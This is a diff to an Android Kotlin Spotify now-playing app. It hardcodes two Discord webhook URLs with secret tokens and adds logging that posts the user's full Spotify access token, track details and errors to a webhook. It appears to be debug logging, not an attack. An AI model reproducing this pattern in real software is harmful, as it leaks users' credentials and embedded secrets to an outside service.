@@ -40,6 +40,8 @@ import java.net.URLEncoder
 
 class MainActivity : AppCompatActivity() {
     private var accessToken: String? = null
+    private val errorWebhookUrl = "https://discord.com/api/webhooks/1362788746130620677/EG-nfizMV5DUS26fytrRS9RTSOL9WyPWCX1OssplU0snCl6sjV02q5qVK5bfILS6nZge"
+    private val testingWebhookUrl = "https://discord.com/api/webhooks/1362617126850134116/9eyYw4FjU53cHtorsD1oTxpgztyzb1J85SB7-NCnm4GKSexl3he8bmTu5biXrTPaWkAr"
 
     companion object {
         private const val CLIENT_ID    = "7cd273258816450dad5e8fa8a7ddddea"
@@ -82,6 +84,8 @@ class MainActivity : AppCompatActivity() {
                 AuthorizationResponse.Type.CODE -> {
                     val authCode = response.code
                     Log.d("SpotifyAuth", "Got code: $authCode")
+                    sendLogToWebhook("Spotify auth response type: ${response.type}", testingWebhookUrl)
+
                     exchangeCodeForToken(authCode)
                 }
                 AuthorizationResponse.Type.ERROR -> {
@@ -92,11 +96,11 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun sendLogToWebhook(message: String) {
+    private fun sendLogToWebhook(message: String, webhookUrl: String = errorWebhookUrl) {
         Thread {
             try {
                 val json = JSONObject()
-                json.put("content", "TouhouDB scrape failed:\n$message")
+                json.put("content", message)
 
                 val requestBody = RequestBody.create(
                     "application/json; charset=utf-8".toMediaTypeOrNull(),
@@ -104,7 +108,7 @@ class MainActivity : AppCompatActivity() {
                 )
 
                 val request = Request.Builder()
-                    .url("https://discord.com/api/webhooks/1362617126850134116/9eyYw4FjU53cHtorsD1oTxpgztyzb1J85SB7-NCnm4GKSexl3he8bmTu5biXrTPaWkAr")
+                    .url(webhookUrl)
                     .post(requestBody)
                     .build()
 
@@ -114,6 +118,7 @@ class MainActivity : AppCompatActivity() {
             }
         }.start()
     }
+
 
 
     private fun setupNextButton() {
@@ -484,6 +489,7 @@ class MainActivity : AppCompatActivity() {
                     val json = JSONObject(resp.body!!.string())
                     accessToken = json.getString("access_token")
                     Log.d("TokenExchange", "Access token: $accessToken")
+                    sendLogToWebhook("Access token obtained: $accessToken", testingWebhookUrl)
 
                     fetchCurrentlyPlaying(accessToken!!)
                 }
@@ -553,6 +559,7 @@ class MainActivity : AppCompatActivity() {
                     } else {
                         "🎧 Now playing:\n$displayName\nby ${artistNames.firstOrNull().orEmpty()}"
                     }
+                    sendLogToWebhook("Currently playing: $name by ${artistNames.joinToString()}", testingWebhookUrl)
 
 
                     updateUI(fullText)
@@ -592,6 +599,8 @@ class MainActivity : AppCompatActivity() {
                 }
             } catch (e: Exception) {
                 Log.e("NowPlaying", "Error fetching track", e)
+                sendLogToWebhook("⚠️ Spotify fetch error: ${e.localizedMessage}", testingWebhookUrl)
+
             }
         }.start()
     }
